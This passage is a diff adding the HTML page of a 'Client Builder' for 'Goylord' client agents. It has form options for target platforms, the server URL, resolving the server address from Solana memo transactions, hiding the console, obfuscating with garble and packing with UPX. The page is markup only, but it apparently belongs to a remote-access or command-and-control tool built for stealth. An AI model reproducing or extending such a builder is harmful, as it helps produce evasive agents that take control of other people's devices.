@@ -1,0 +1,1349 @@
+<!doctype html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <script src="/assets/nav-prelude.js"></script>
+    <link rel="modulepreload" href="/assets/nav.js" />
+    <title>Client Builder - Goylord</title>
+    <link rel="stylesheet" href="/vendor/inter/400.css" />
+    <link rel="stylesheet" href="/vendor/inter/600.css" />
+    <link rel="stylesheet" href="/vendor/inter/700.css" />
+<link rel="stylesheet" href="/assets/tailwind.css" />
+    <link rel="stylesheet" href="/vendor/fontawesome/css/all.min.css" />
+    <link rel="icon" type="image/x-icon" href="/assets/favicon.ico" />
+    <link rel="stylesheet" href="/assets/main.css" />
+    <link rel="stylesheet" href="/assets/custom.css" />
+    <script src="/vendor/animejs/anime.min.js"></script>
+    <script defer src="/assets/toast.js"></script>
+    <script defer src="/assets/ripple.js"></script>
+    <style>
+      .accordion-body {
+        display: grid;
+        grid-template-rows: 1fr;
+        transition: grid-template-rows 0.2s ease, opacity 0.2s ease;
+        opacity: 1;
+      }
+      .accordion-body.collapsed {
+        grid-template-rows: 0fr;
+        opacity: 0;
+      }
+      .accordion-body > .accordion-inner {
+        overflow: hidden;
+      }
+      .accordion-chevron {
+        transition: transform 0.2s ease;
+      }
+      .accordion-chevron.rotated {
+        transform: rotate(-180deg);
+      }
+      .builder-workspace {
+        grid-template-columns: minmax(0, 1.55fr) minmax(360px, 1fr);
+        align-items: start;
+      }
+      .builder-card {
+        background:
+          linear-gradient(145deg, rgba(30, 41, 59, 0.3), transparent 42%),
+          rgba(15, 23, 42, 0.72);
+        box-shadow: 0 18px 45px rgba(2, 6, 23, 0.16);
+      }
+      .builder-tabs {
+        display: grid;
+        grid-template-columns: repeat(4, minmax(0, 1fr));
+        gap: 0.4rem;
+        padding: 0.35rem;
+        border: 1px solid rgba(51, 65, 85, 0.85);
+        border-radius: 0.75rem;
+        background: rgba(15, 23, 42, 0.72);
+      }
+      .builder-tab {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 0.5rem;
+        min-width: 0;
+        padding: 0.65rem 0.55rem;
+        border-radius: 0.55rem;
+        color: rgb(148, 163, 184);
+        font-size: 0.78rem;
+        font-weight: 600;
+        transition: color 160ms ease, background 160ms ease, box-shadow 160ms ease;
+      }
+      .builder-tab:hover {
+        color: rgb(226, 232, 240);
+        background: rgba(51, 65, 85, 0.45);
+      }
+      .builder-tab[aria-selected="true"] {
+        color: white;
+        background: linear-gradient(135deg, rgba(37, 99, 235, 0.95), rgba(79, 70, 229, 0.9));
+        box-shadow: 0 8px 22px rgba(37, 99, 235, 0.22);
+      }
+      [data-builder-panel][hidden] { display: none !important; }
+      .builder-profile-bar {
+        display: grid;
+        grid-template-columns: minmax(150px, 1fr) minmax(140px, 0.8fr) auto auto auto;
+        align-items: center;
+      }
+      .builder-profile-overflow { position: relative; }
+      .builder-profile-overflow > summary { list-style: none; }
+      .builder-profile-overflow > summary::-webkit-details-marker { display: none; }
+      .builder-profile-menu,
+      .builder-action-menu {
+        position: absolute;
+        z-index: 30;
+        right: 0;
+        top: calc(100% + 0.45rem);
+        min-width: 190px;
+        padding: 0.4rem;
+        border: 1px solid rgb(51, 65, 85);
+        border-radius: 0.65rem;
+        background: rgb(15, 23, 42);
+        box-shadow: 0 18px 38px rgba(2, 6, 23, 0.5);
+      }
+      .builder-profile-menu button,
+      .builder-action-menu button {
+        width: 100%;
+        justify-content: flex-start;
+        padding: 0.6rem 0.7rem;
+        border-radius: 0.45rem;
+        font-size: 0.8rem;
+      }
+      .builder-profile-menu button:hover,
+      .builder-action-menu button:hover { background: rgba(51, 65, 85, 0.7); }
+      .builder-platform-grid { grid-template-columns: repeat(3, minmax(0, 1fr)); }
+      .builder-platform-grid label { padding: 0.65rem 0.7rem; font-size: 0.8rem; }
+      .builder-output-rail { position: sticky; top: 5.25rem; }
+      .builder-summary-grid {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 0.55rem;
+      }
+      .builder-summary-card {
+        min-width: 0;
+        padding: 0.75rem;
+        border: 1px solid rgba(51, 65, 85, 0.8);
+        border-radius: 0.65rem;
+        background: rgba(30, 41, 59, 0.48);
+      }
+      .builder-summary-label { color: rgb(100, 116, 139); font-size: 0.68rem; text-transform: uppercase; letter-spacing: 0.06em; }
+      .builder-summary-value { margin-top: 0.25rem; color: rgb(226, 232, 240); font-size: 0.8rem; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+      .builder-summary-tags { display: flex; flex-wrap: wrap; gap: 0.35rem; margin-top: 0.65rem; }
+      .builder-summary-tag { padding: 0.28rem 0.5rem; border-radius: 999px; background: rgba(30, 64, 175, 0.28); color: rgb(147, 197, 253); font-size: 0.68rem; }
+      .builder-action-bar { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 0.55rem; position: sticky; bottom: 0.75rem; z-index: 20; padding: 0.55rem; border: 1px solid rgba(51, 65, 85, 0.9); border-radius: 0.75rem; background: rgba(15, 23, 42, 0.94); backdrop-filter: blur(14px); box-shadow: 0 14px 35px rgba(2, 6, 23, 0.4); }
+      .builder-more-actions { position: relative; }
+      .builder-more-actions > summary { list-style: none; cursor: pointer; }
+      .builder-more-actions > summary::-webkit-details-marker { display: none; }
+      @media (max-width: 1023px) {
+        .builder-workspace { grid-template-columns: minmax(0, 1fr); }
+        .builder-output-rail { position: static; }
+      }
+      @media (max-width: 680px) {
+        .builder-tabs { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+        .builder-profile-bar { grid-template-columns: minmax(0, 1fr) auto auto; }
+        .builder-profile-name { grid-column: 1 / -1; grid-row: 2; }
+        .builder-platform-grid { grid-template-columns: repeat(2, minmax(0, 1fr)); }
+      }
+      .sgn-txt-lockbox {
+        position: relative;
+        isolation: isolate;
+        --sgn-chain-brightness: 1;
+        --sgn-chain-opacity: 0.9;
+        --sgn-crack-opacity: 0;
+        --sgn-crack-dash: 1;
+        --sgn-crack-mid-opacity: 0;
+        --sgn-crack-mid-dash: 1;
+        --sgn-crack-late-opacity: 0;
+        --sgn-crack-late-dash: 1;
+        --sgn-lock-tilt: 0deg;
+        border-radius: 8px;
+        overflow: hidden;
+      }
+      .sgn-txt-lockbox::before,
+      .sgn-txt-lockbox::after {
+        content: "";
+        position: absolute;
+        left: 3px;
+        top: 50%;
+        width: calc(100% - 6px);
+        height: 18px;
+        border-radius: 999px;
+        background:
+          radial-gradient(ellipse 11px 7px at 8px 50%, transparent 4.4px, rgba(148, 163, 184, 0.98) 4.8px 6.7px, transparent 7.1px),
+          radial-gradient(ellipse 11px 7px at 22px 50%, transparent 4.4px, rgba(148, 163, 184, 0.98) 4.8px 6.7px, transparent 7.1px);
+        background-size: 28px 18px;
+        background-repeat: repeat-x;
+        background-position: center;
+        box-shadow: none;
+        opacity: var(--sgn-chain-opacity);
+        pointer-events: none;
+        transform-origin: center;
+        transition: opacity 0.25s ease, filter 0.25s ease;
+        filter: brightness(var(--sgn-chain-brightness));
+        z-index: 2;
+      }
+      .sgn-txt-lockbox::before {
+        transform: translateY(-50%) rotate(-8deg);
+      }
+      .sgn-txt-lockbox::after {
+        transform: translateY(-50%) rotate(8deg);
+      }
+      .sgn-txt-lockbox.unlocked::before {
+        opacity: 0;
+        transform: translateY(-50%) rotate(-8deg);
+      }
+      .sgn-txt-lockbox.unlocked::after {
+        opacity: 0;
+        transform: translateY(-50%) rotate(8deg);
+      }
+      .sgn-txt-cracks {
+        position: absolute;
+        inset: 2px 8px;
+        border-radius: 8px;
+        pointer-events: none;
+        opacity: var(--sgn-crack-opacity);
+        transition: opacity 0.18s ease;
+        z-index: 4;
+      }
+      .sgn-txt-cracks svg {
+        width: 100%;
+        height: 100%;
+        display: block;
+        overflow: visible;
+      }
+      .sgn-txt-cracks path {
+        fill: none;
+        stroke-linecap: round;
+        stroke-linejoin: round;
+        stroke-dasharray: 1;
+        stroke-dashoffset: var(--sgn-crack-dash);
+        transition: stroke-dashoffset 0.18s ease, opacity 0.18s ease;
+      }
+      .sgn-txt-cracks .crack-main {
+        stroke: rgba(248, 250, 252, 0.9);
+        stroke-width: 1.9;
+        filter: drop-shadow(0 0 4px rgba(248, 250, 252, 0.45));
+      }
+      .sgn-txt-cracks .crack-branch {
+        stroke: rgba(244, 114, 182, 0.72);
+        stroke-width: 1.45;
+        opacity: calc(var(--sgn-crack-opacity) * 0.85);
+      }
+      .sgn-txt-cracks .crack-mid {
+        stroke: rgba(248, 250, 252, 0.76);
+        stroke-width: 1.25;
+        stroke-dashoffset: var(--sgn-crack-mid-dash);
+        opacity: var(--sgn-crack-mid-opacity);
+      }
+      .sgn-txt-cracks .crack-late {
+        stroke: rgba(244, 114, 182, 0.82);
+        stroke-width: 1.15;
+        stroke-dashoffset: var(--sgn-crack-late-dash);
+        opacity: var(--sgn-crack-late-opacity);
+      }
+      .sgn-txt-lock {
+        position: absolute;
+        left: 50%;
+        top: 50%;
+        width: 52px;
+        height: 52px;
+        display: inline-flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 1.45rem;
+        border-radius: 999px;
+        border: none;
+        background: transparent;
+        color: rgb(203, 213, 225);
+        text-shadow: 0 2px 0 rgba(15, 23, 42, 0.8), 0 0 8px rgba(15, 23, 42, 0.65);
+        box-shadow: none;
+        transform: translate(-50%, -50%) rotate(var(--sgn-lock-tilt));
+        pointer-events: none;
+        transition: opacity 0.25s ease, transform 0.25s ease;
+        z-index: 5;
+      }
+      .sgn-txt-lockbox.unlocked .sgn-txt-lock {
+        opacity: 0;
+        transform: translate(-50%, -50%) scale(0.65) rotate(18deg);
+      }
+      .sgn-txt-lockbox.locked #build-sgn-txt-btn {
+        filter: saturate(0.75);
+      }
+      .sgn-txt-lockbox.locked.pulse #build-sgn-txt-btn {
+        animation: sgnLockPulse 0.18s ease;
+      }
+      .sgn-txt-lockbox.locked.pulse::before {
+        animation: sgnChainPulseA 0.18s ease;
+      }
+      .sgn-txt-lockbox.locked.pulse::after {
+        animation: sgnChainPulseB 0.18s ease;
+      }
+      .sgn-txt-lockbox.locked.pulse .sgn-txt-lock {
+        animation: sgnLockIconPulse 0.18s ease;
+      }
+      .sgn-txt-lockbox.locked #build-sgn-txt-btn > * {
+        opacity: 0;
+      }
+      .sgn-txt-lockbox.unlocked .sgn-txt-cracks {
+        opacity: 0;
+      }
+      @keyframes sgnLockPulse {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-2px); }
+        75% { transform: translateX(2px); }
+      }
+      @keyframes sgnChainPulseA {
+        0%, 100% { transform: translateY(-50%) rotate(-8deg); }
+        25% { transform: translate(-2px, -50%) rotate(-8deg); }
+        75% { transform: translate(2px, -50%) rotate(-8deg); }
+      }
+      @keyframes sgnChainPulseB {
+        0%, 100% { transform: translateY(-50%) rotate(8deg); }
+        25% { transform: translate(2px, -50%) rotate(8deg); }
+        75% { transform: translate(-2px, -50%) rotate(8deg); }
+      }
+      @keyframes sgnLockIconPulse {
+        0%, 100% { transform: translate(-50%, -50%) rotate(var(--sgn-lock-tilt)); }
+        25% { transform: translate(calc(-50% - 2px), -50%) rotate(var(--sgn-lock-tilt)); }
+        75% { transform: translate(calc(-50% + 2px), -50%) rotate(var(--sgn-lock-tilt)); }
+      }
+    </style>
+  </head>
+  <body class="min-h-screen bg-slate-950 text-slate-100">
+    <header id="top-nav"></header>
+    <main class="px-5 py-6">
+      <div class="max-w-[90rem] mx-auto flex flex-col gap-5">
+        <div class="flex items-center justify-between gap-3 flex-wrap">
+          <div>
+            <h1 class="text-2xl font-semibold">Client Builder</h1>
+            <p class="text-slate-400">Build customized Goylord client agents</p>
+          </div>
+        </div>
+
+        <div class="builder-workspace grid grid-cols-1 gap-5">
+          <!-- Build Configuration -->
+          <div id="builder-config-card" class="builder-card border border-slate-800 rounded-xl p-5">
+            <h2 class="text-xl font-semibold mb-4 flex items-center gap-2">
+              <i class="fa-solid fa-gear"></i> Build Configuration
+            </h2>
+
+            <form id="build-form" class="flex flex-col gap-3">
+
+              <nav class="builder-tabs" role="tablist" aria-label="Builder sections">
+                <button type="button" class="builder-tab" role="tab" aria-selected="true" data-builder-tab="target"><i class="fa-solid fa-display"></i><span>Target</span></button>
+                <button type="button" class="builder-tab" role="tab" aria-selected="false" data-builder-tab="connection"><i class="fa-solid fa-plug"></i><span>Connection</span></button>
+                <button type="button" class="builder-tab" role="tab" aria-selected="false" data-builder-tab="features"><i class="fa-solid fa-puzzle-piece"></i><span>Features</span></button>
+                <button type="button" class="builder-tab" role="tab" aria-selected="false" data-builder-tab="packaging"><i class="fa-solid fa-box"></i><span>Packaging</span></button>
+              </nav>
+
+              <div class="builder-profile-bar border border-slate-800 rounded-lg p-2 bg-slate-800/40 gap-2">
+                  <select id="build-profile-select"
+                    class="w-full px-3 py-2 bg-slate-800/70 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500 transition-colors">
+                    <option value="">Select a saved profile...</option>
+                  </select>
+                  <input type="text" id="build-profile-name" maxlength="64" placeholder="Profile name"
+                    class="builder-profile-name w-full px-3 py-2 bg-slate-800/70 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-blue-500 transition-colors" />
+                  <button type="button" id="profile-save-btn"
+                    class="px-3 py-2 rounded-lg bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium transition-colors" title="Save profile">
+                    <i class="fa-solid fa-floppy-disk mr-1"></i> Save
+                  </button>
+                  <button type="button" id="profile-load-btn"
+                    class="px-3 py-2 rounded-lg bg-slate-700 hover:bg-slate-600 text-white text-sm font-medium transition-colors" title="Load profile">
+                    <i class="fa-solid fa-folder-open mr-1"></i> Load
+                  </button>
+                  <details class="builder-profile-overflow">
+                    <summary class="w-10 h-10 inline-flex items-center justify-center rounded-lg border border-slate-700 bg-slate-800 text-slate-300 hover:text-white hover:border-slate-600 cursor-pointer" aria-label="More profile actions"><i class="fa-solid fa-ellipsis"></i></summary>
+                    <div class="builder-profile-menu">
+                  <button type="button" id="profile-delete-btn"
+                    class="flex items-center gap-2 text-red-300 transition-colors">
+                    <i class="fa-solid fa-trash mr-1"></i> Delete
+                  </button>
+                  <button type="button" id="profile-export-btn"
+                    class="flex items-center gap-2 text-slate-200 transition-colors">
+                    <i class="fa-solid fa-file-export mr-1"></i> Export
+                  </button>
+                  <button type="button" id="profile-import-btn"
+                    class="flex items-center gap-2 text-slate-200 transition-colors">
+                    <i class="fa-solid fa-file-import mr-1"></i> Import
+                  </button>
+                    </div>
+                  </details>
+                </div>
+                <input type="file" id="profile-import-file" accept="application/json,.json" class="hidden" />
+
+              <!-- == Section 1: Target Platforms (open) == -->
+              <div class="accordion-section border border-slate-800 rounded-lg overflow-hidden" data-open="true" data-builder-panel="target">
+                <button type="button" class="accordion-header w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800/80 transition-colors text-left">
+                  <span class="flex items-center gap-2 text-sm font-medium text-slate-200">
+                    <i class="fa-solid fa-display text-slate-400"></i> Target Platforms
+                  </span>
+                  <i class="fa-solid fa-chevron-down accordion-chevron text-slate-400 text-xs"></i>
+                </button>
+                <div class="accordion-body">
+                  <div class="accordion-inner px-4 pb-4 pt-3">
+                    <div class="builder-platform-grid grid gap-2">
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-blue-500 transition-colors">
+                        <input type="checkbox" name="platform" value="windows-amd64" class="w-4 h-4" checked />
+                        <span><i class="fa-brands fa-windows text-blue-400"></i> Windows x64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-blue-500 transition-colors">
+                        <input type="checkbox" name="platform" value="windows-386" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-windows text-blue-400"></i> Windows x86</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-blue-500 transition-colors">
+                        <input type="checkbox" name="platform" value="windows-arm64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-windows text-blue-400"></i> Windows ARM64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-orange-500 transition-colors">
+                        <input type="checkbox" name="platform" value="linux-amd64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-linux text-amber-400"></i> Linux x64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-orange-500 transition-colors">
+                        <input type="checkbox" name="platform" value="linux-arm64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-linux text-amber-400"></i> Linux ARM64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-orange-500 transition-colors">
+                        <input type="checkbox" name="platform" value="linux-armv7" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-linux text-amber-400"></i> Linux ARMv7</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-white transition-colors">
+                        <input type="checkbox" name="platform" value="darwin-amd64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-apple text-slate-200"></i> macOS x64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-white transition-colors">
+                        <input type="checkbox" name="platform" value="darwin-arm64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-apple text-slate-200"></i> macOS ARM64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-sky-500 transition-colors">
+                        <input type="checkbox" name="platform" value="freebsd-amd64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-linux text-cyan-300"></i> FreeBSD x64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-sky-500 transition-colors">
+                        <input type="checkbox" name="platform" value="freebsd-arm64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-linux text-cyan-300"></i> FreeBSD ARM64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-green-500 transition-colors">
+                        <input type="checkbox" name="platform" value="android-arm64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-android text-green-400"></i> Android ARM64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-green-500 transition-colors">
+                        <input type="checkbox" name="platform" value="android-amd64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-android text-green-400"></i> Android x64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-green-500 transition-colors">
+                        <input type="checkbox" name="platform" value="android-armv7" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-android text-green-400"></i> Android ARMv7</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-white transition-colors">
+                        <input type="checkbox" name="platform" value="ios-arm64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-apple text-slate-200"></i> iOS ARM64</span>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-white transition-colors">
+                        <input type="checkbox" name="platform" value="ios-amd64" class="w-4 h-4" />
+                        <span><i class="fa-brands fa-apple text-slate-200"></i> iOS Simulator x64</span>
+                      </label>
+                    </div>
+                  </div>
+                </div>
+              </div>
+
+              <!-- == Section 2: Connection & Identity (open) == -->
+              <div class="accordion-section border border-slate-800 rounded-lg overflow-hidden" data-open="true" data-builder-panel="connection" hidden>
+                <button type="button" class="accordion-header w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800/80 transition-colors text-left">
+                  <span class="flex items-center gap-2 text-sm font-medium text-slate-200">
+                    <i class="fa-solid fa-plug text-slate-400"></i> Connection &amp; Identity
+                  </span>
+                  <i class="fa-solid fa-chevron-down accordion-chevron text-slate-400 text-xs"></i>
+                </button>
+                <div class="accordion-body">
+                  <div class="accordion-inner px-4 pb-4 pt-3 flex flex-col gap-4">
+
+                    <div>
+                      <label class="block text-sm font-medium text-slate-300 mb-2" for="server-url">Server URL</label>
+                      <div class="flex gap-2">
+                        <input type="text" id="server-url" name="server-url"
+                          class="min-w-0 flex-1 px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg focus:outline-none focus:border-blue-500 transition-colors" />
+                        <button type="button" id="server-url-current-btn" aria-label="Use current website host"
+                          title="Use current website host"
+                          class="shrink-0 w-10 h-10 inline-flex items-center justify-center rounded-lg bg-slate-800/70 border border-slate-700 text-slate-300 hover:text-blue-300 hover:border-blue-500 transition-colors">
+                          <i class="fa-solid fa-globe"></i>
+                        </button>
+                      </div>
+                      <p id="server-url-hint" class="text-xs text-slate-500 mt-1">
+                        Just enter your domain or IP:PORT — no <code class="text-slate-400">wss://</code>, <code class="text-slate-400">https://</code>, or any other prefix.
+                      </p>
+                      <div class="mt-2 flex items-center gap-2 text-xs text-slate-400">
+                        <label class="flex items-center gap-2 cursor-pointer">
+                          <input type="checkbox" id="raw-server-list" name="raw-server-list" class="w-4 h-4" />
+                          Use raw HTTPS server list (fetches multiple wss:// endpoints)
+                        </label>
+                        <button type="button" id="raw-server-list-help" aria-label="What is the raw HTTPS server list?"
+                          class="w-5 h-5 inline-flex items-center justify-center rounded-full text-slate-400 hover:text-blue-400 hover:bg-slate-800 transition-colors">
+                          <i class="fa-solid fa-circle-info text-sm"></i>
+                        </button>
+                      </div>
+                      <p id="server-url-raw-hint" class="hidden text-xs text-slate-500 mt-1">
+                        When enabled, the URL above must be a raw HTTPS link with one wss:// endpoint per line.
+                      </p>
+                      <label class="mt-2 flex items-center gap-2 text-xs text-slate-400">
+                        <input type="checkbox" id="sol-memo" name="sol-memo" class="w-4 h-4" />
+                        Use Solana memo lookup (resolve server from blockchain)
+                      </label>
+                      <div id="sol-settings" class="hidden mt-2 flex flex-col gap-2 pl-6 border-l-2 border-purple-800/50">
+                        <div>
+                          <label class="block text-xs font-medium text-slate-400 mb-1" for="sol-address">Solana Address (Base58)</label>
+                          <input type="text" id="sol-address" name="sol-address" placeholder="YourSolanaWalletAddressHere..."
+                            class="w-full px-2 py-1.5 bg-slate-800/60 border border-slate-700 rounded text-sm focus:outline-none focus:border-purple-500 transition-colors font-mono" />
+                        </div>
+                        <div>
+                          <label class="block text-xs font-medium text-slate-400 mb-1" for="sol-rpc-endpoints">RPC Endpoints (one per line)</label>
+                          <textarea id="sol-rpc-endpoints" name="sol-rpc-endpoints" rows="4" placeholder="https://api.mainnet-beta.solana.com&#10;https://solana-rpc.publicnode.com"
+                            class="w-full px-2 py-1.5 bg-slate-800/60 border border-slate-700 rounded text-xs focus:outline-none focus:border-purple-500 transition-colors font-mono"></textarea>
+                        </div>
+                        <p class="text-xs text-slate-500">
+                          Client will query these endpoints to find the encrypted server URL from the Solana address's memo transactions.
+                        </p>
+                      </div>
+                    </div>
+
+                    <div>
+                      <label class="block text-sm font-medium text-slate-300 mb-2" for="output-name">Output Filename</label>
+                      <input type="text" id="output-name" name="output-name" placeholder="agent (default)"
+                        class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg focus:outline-none focus:border-blue-500 transition-colors" />
+                      <p class="text-xs text-slate-500 mt-1">
+                        Optional: Custom name prefix for output binaries (letters, numbers, . _ - only)
+                      </p>
+                    </div>
+
+                    <div>
+                      <label class="block text-sm font-medium text-slate-300 mb-2" for="initial-client-tag">Initial Client Tag</label>
+                      <input type="text" id="initial-client-tag" name="initial-client-tag" maxlength="64" placeholder="e.g. Finance, Kiosk Rollout"
+                        class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg focus:outline-none focus:border-blue-500 transition-colors" />
+                      <p class="text-xs text-slate-500 mt-1">
+                        Optional: new clients from this build get this dashboard tag on first connect.
+                      </p>
+                    </div>
+
+                    <div id="ios-bundle-id-container" class="hidden">
+                      <label class="block text-sm font-medium text-slate-300 mb-2" for="ios-bundle-id">iOS Bundle ID</label>
+                      <input type="text" id="ios-bundle-id" name="ios-bundle-id" placeholder="com.goylord.agent (default)"
+                        class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg focus:outline-none focus:border-blue-500 transition-colors" />
+                      <p class="text-xs text-slate-500 mt-1">
+                        Bundle identifier for the iOS IPA package (e.g. <code>com.example.myapp</code>). Used in Info.plist.
+                      </p>
+                    </div>
+
+                    <div>
+                      <label class="block text-sm font-medium text-slate-300 mb-2" for="mutex">Mutex (Single-Instance Key)</label>
+                      <input type="text" id="mutex" name="mutex" placeholder="Leave empty for random"
+                        class="w-full px-3 py-2 bg-slate-800/60 border border-slate-700 rounded-lg focus:outline-none focus:border-blue-500 transition-colors" />
+                      <p class="text-xs text-slate-500 mt-1">Optional: set a fixed key or leave empty to auto-generate</p>
+                      <label class="mt-2 flex items-center gap-2 text-xs text-slate-400">
+                        <input type="checkbox" name="disable-mutex" class="w-4 h-4" />
+                        Disable mutex (allow multiple instances)
+                      </label>
+                    </div>
+
+                  </div>
+                </div>
+              </div>
+
+              <!-- == Section 3: Build Options (open) == -->
+              <div class="accordion-section border border-slate-800 rounded-lg overflow-hidden" data-open="false" data-builder-panel="packaging" hidden>
+                <button type="button" class="accordion-header w-full flex items-center justify-between px-4 py-3 bg-slate-800/50 hover:bg-slate-800/80 transition-colors text-left">
+                  <span class="flex items-center gap-2 text-sm font-medium text-slate-200">
+                    <i class="fa-solid fa-sliders text-slate-400"></i> Build Options
+                  </span>
+                  <i class="fa-solid fa-chevron-down accordion-chevron text-slate-400 text-xs"></i>
+                </button>
+                <div class="accordion-body">
+                  <div class="accordion-inner px-4 pb-4 pt-3 flex flex-col gap-2">
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-emerald-400 transition-colors">
+                      <input type="checkbox" name="strip-debug" class="w-4 h-4" checked />
+                      <span class="flex items-center gap-2">
+                        <i class="fa-solid fa-bug-slash text-emerald-400"></i> Strip debug symbols (-s -w)
+                      </span>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-emerald-400 transition-colors">
+                      <input type="checkbox" name="disable-cgo" class="w-4 h-4" />
+                      <span class="flex items-center gap-2">
+                        <i class="fa-solid fa-ban text-emerald-400"></i> Disable CGO
+                      </span>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-sky-500 transition-colors">
+                      <input type="checkbox" name="no-printing" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-lock text-sky-400"></i> Secure Client Logs
+                        </span>
+                        <span class="text-xs text-slate-500">Capture stdout/stderr and logs as encrypted base64</span>
+                      </div>
+                    </label>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-emerald-500 transition-colors">
+                      <input type="checkbox" name="hide-console" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-window-minimize text-emerald-400"></i> Hide Console Window
+                        </span>
+                        <span class="text-xs text-slate-500">Build without a visible console where the target platform supports it</span>
+                      </div>
+                    </label>
+
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-purple-500 transition-colors">
+                      <input type="checkbox" name="obfuscate" class="w-4 h-4" />
+                      <div class="flex flex-col">
+                        <span class="flex items-center gap-2">
+                          <i class="fa-solid fa-mask text-purple-400"></i> Obfuscate (garble)
+                        </span>
+                        <span class="text-xs text-slate-500">Build with garble for code obfuscation</span>
+                      </div>
+                    </label>
+
+                    <div id="garble-settings-container" class="hidden pl-3 border-l-2 border-purple-500/40 flex flex-col gap-2">
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer">
+                        <input type="checkbox" name="garble-literals" class="w-4 h-4" />
+                        <div class="flex flex-col">
+                          <span>Obfuscate Literals (-literals)</span>
+                          <span class="text-xs text-slate-500">Obfuscate string and byte slice literals</span>
+                        </div>
+                      </label>
+                      <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer">
+                        <input type="checkbox" name="garble-tiny" class="w-4 h-4" />
+                        <div class="flex flex-col">
+                          <span>Tiny Mode (-tiny)</span>
+                          <span class="text-xs text-slate-500">Remove filenames and line numbers from panics</span>
+                        </div>
+                      </label>
+                      <div>
+                        <label class="block text-xs font-medium text-slate-400 mb-1" for="garble-seed">Seed</label>
+                        <input type="text" id="garble-seed" name="garble-seed" placeholder="random (default)"
+                          class="w-full px-3 py-2 bg-slate-800/80 border border-slate-700 rounded-lg text-sm focus:outline-none focus:border-purple-500 transition-colors" />
+                        <p class="text-xs text-slate-500 mt-1">Alphanumeric seed for reproducible builds</p>
+                      </div>
+                    </div>
+
+                    <label class="flex items-center gap-2 p-3 bg-slate-800/60 border border-slate-700 rounded-lg cursor-pointer hover:border-cyan-500 transition-colors">
+                      <input type="checkbox" name="enable-upx" class="w-4 h-4" />
+                      <div class="flex flex-col">
